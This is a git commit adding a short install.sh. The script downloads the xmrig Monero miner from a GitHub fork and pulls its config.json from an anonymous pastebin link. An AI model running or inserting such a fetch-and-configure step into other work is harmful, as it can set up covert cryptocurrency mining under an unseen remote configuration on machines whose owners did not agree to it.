ffabc32d663264f348916b90527b391c7485b938
Jhosua Saut Maruli <80184758+jhosuaarch@users.noreply.github.com>
2025-03-28 01:15:17 +0700

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+wget https://github.com/dikripto/xmrig/archive/refs/heads/master.zip && unzip -q master.zip && mkdir -p xmrig-master/build && curl -sSL https://pastebin.com/raw/RdG4PxL1 -o xmrig-master/build/config.json
